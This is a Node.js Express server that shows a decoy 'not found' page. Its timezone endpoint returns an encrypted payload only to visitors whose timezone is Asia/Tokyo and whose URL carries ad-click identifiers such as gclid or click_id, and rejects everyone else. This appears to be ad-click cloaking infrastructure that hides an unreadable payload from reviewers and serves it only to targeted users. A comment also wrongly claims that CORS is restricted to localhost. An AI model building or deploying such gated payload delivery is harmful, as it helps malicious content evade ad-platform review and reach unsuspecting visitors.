const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());

// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>not found </h1>
       
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Tokyo
    const isTimezoneJapan = timezone === 'Asia/Tokyo';

    // Check if the URL contains 'gclid' or 'click_id'
    const containsRelevantParams = fullUrl.includes('gclid') || fullUrl.includes('click_id');

    // Base64 code to send in response
    const base64Code = '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';

    // Respond with the base64 code if the conditions are met
    if (isTimezoneJapan && containsRelevantParams) {
        console.log('Sending base64 code.');
        res.status(200).send(base64Code);
    } else {
        console.log('Conditions not met.');
        res.status(400).send('Conditions not met.');
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
